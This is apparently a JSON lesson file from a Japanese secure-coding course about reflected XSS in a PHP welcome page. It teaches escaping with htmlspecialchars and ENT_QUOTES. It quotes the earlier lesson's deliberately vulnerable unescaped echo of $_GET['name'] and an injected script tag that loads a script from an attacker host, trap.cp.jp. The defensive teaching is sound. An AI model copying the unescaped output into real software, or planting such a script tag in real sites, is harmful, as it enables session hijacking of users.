{
    "index": 0,
    "fileName": "welcome.php",
    "explainers": [
        {
            "questionIndices": [],
            "focusLabels": [],
            "focusComponents": [
                []
            ],
            "messages": [
                {
                    "text": "このWebサイトはセッションIDを生成し、GETリクエストで受け取ったユーザの名前を表示するだけの簡単なものです。",
                    "languages": []
                },
                {
                    "text": "体験編のレッスンではあえてこのサイト内に脆弱性を作り込むことによって、どのようなコードを書くと攻撃者に狙われてしまうのかを学習し、ユーザのセッションIDが盗まれてしまう事例を体験しました。\n対策編ではセキュアなコードを書き、脆弱性を作り込まないようにしていきます。",
                    "languages": []
                }
            ]
        },
        {
            "questionIndices": [],
            "focusLabels": [],
            "focusComponents": [
                [5, 6, 7]
            ],
            "messages": [
                {
                    "text": "体験編のレッスンではこの赤枠で囲まれた部分に脆弱性を作りこみました。\nその時に書いたコードを以下に示します。\n<p><?php echo $_GET[\"name\"]; ?>さん</p>",
                    "languages": ["html", "php"]
                },
                {
                    "text": "特殊文字のエスケープを行わずにGETリクエストで受け取った値を表示していました。\nその結果、攻撃者に以下のタグを埋め込まれてしまいました。\n<script src=http://www.trap.cp.jp/iframe_injection.js></script>",
                    "languages": ["html"]
                },
                {
                    "text": "この攻撃への対策として、今回は特殊文字のエスケープを学習します。\n特殊文字のエスケープを行うことによって、HTMLにおいて特別な意味を持つ文字を通常の文字として扱うことができるようになります。",
                    "languages": []
                },
                {
                    "text": "例えば、HTMLで以下のコードを書くと\n<p>Hello World</p>\n以下のように表示されます。\nHello World",
                    "languages": ["html"]
                },
                {
                    "text": "この「<p>Hello World</p>」に対して特殊文字のエスケープを行うには以下のように書きます。\n&lt;p&gt;Hello World&lt;/p&gt;",
                    "languages": ["html"]
                },
                {
                    "text": "その結果、Webブラウザ上では以下のように表示されます。\n<p>Hello World</p>",
                    "languages": []
                },
                {
                    "text": "「<」と「>」はHTMLにおいてタグを記述するのに使われるため特別な意味を持っていますが、「<」を&lt;、「>」を&gt;に置き換えることによってHTMLタグの記述をするための文字として解釈されるのではなく、通常の文字として解釈され表示されます。",
                    "languages": ["html"]
                },
                {
                    "text": "なお、エスケープできる特殊文字は他にもありますので各自で調べてみてください。",
                    "languages": [
                        "html"
                    ]
                },
                {
                    "text": "この特殊文字のエスケープを行うことによって、体験編で攻撃者に埋め込まれてしまった「<script src=http://www.trap.cp.jp/iframe_injection.js></script>」という文字列をスクリプトを読み込むためのタグとして解釈させるのではなく、単純な文字列として解釈させることが可能になります。",
                    "languages": [
                        "html"
                    ]
                },
                {
                    "text": "つまり、「<script src=http://www.trap.cp.jp/iframe_injection.js></script>」を「&lt;script src=http://www.trap.cp.jp/iframe_injection.js&gt;&lt;/script&gt;」としてから表示することによって攻撃を防ぐことができます。",
                    "languages": [
                        "html"
                    ]
                },
                {
                    "text": "これを自動で行ってくれるPHPの関数がhtmlspecialcharsです。\nhtmlspecialcharsは第1引数にエスケープしたい文字列を渡し、第2引数にオプションを渡します。\n通常は第2引数にENT_QUOTESを渡します。",
                    "languages": []
                },
                {
                    "text": "htmlspecialcharsの第2引数を省略することもできますがその場合は、「'」のエスケープが行われません。\n「'」をエスケープしていない場合、XSS脆弱性となり攻撃を仕掛けることが可能になってしまいます。",
                    "languages": []
                },
                {
                    "text": "詳しくは「引用符を狙った攻撃」というセクションの「属性値を引用符で囲まないことによる脆弱性」というレッスンで解説していますのでそちらを参考にしてください。",
                    "languages": []
                },
                {
                    "text": "それでは実際に特殊文字をエスケープしてから表示するコードを書いてみましょう。",
                    "languages": []
                }
            ]
        },
        {
            "questionIndices": [0],
            "focusLabels": [],
            "focusComponents": [
                []
            ],
            "messages": [
                {
                    "text": "特殊文字をエスケープしてから表示しているため、攻撃者がコードを埋め込むことは不可能になっています。",
                    "languages": []
                },
                {
                    "text": "以上で今回の説明は終了です。\n他のファイルについては体験編のレッスンと同じものを使用していますので、詳しい説明はそちらを参考にしてください。",
                    "languages": []
                },
                {
                    "text": "それでは実際にプレビューを確認し、攻撃が不可能であることを見ていきましょう。",
                    "languages": []
                }
            ]
        }
    ]
}